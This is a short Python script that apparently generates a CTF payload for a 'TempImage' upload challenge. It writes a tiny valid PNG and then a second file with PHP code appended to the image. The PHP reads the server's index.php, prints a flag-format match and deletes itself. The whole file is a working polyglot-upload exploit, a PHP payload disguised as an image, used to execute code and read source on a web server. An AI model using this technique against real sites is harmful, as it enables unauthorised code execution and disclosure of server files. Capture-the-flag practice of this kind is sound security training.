"""Create test PNGs, including a one-shot PHP source reader for TempImage."""

import base64
from pathlib import Path


png = base64.b64decode(
    "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAwMCAO+jRuoAAAAASUVORK5CYII="
)
Path("tempimage-test.png").write_bytes(png)
php = (
    "<?php "
    "$src=@file_get_contents(__DIR__.'/index.php'); "
    "if($src!==false && preg_match('/\\^FLAG\\^[0-9a-f]{64}\\$FLAG\\$/i',$src,$m)) "
    "{ echo $m[0]; } else { echo 'flag not found'; } "
    "@unlink(__FILE__); "
    "?>"
).encode("ascii")
Path("tempimage-payload.png").write_bytes(png + php)
print(f"Created {len(png) + len(php)}-byte PNG/PHP test payload")

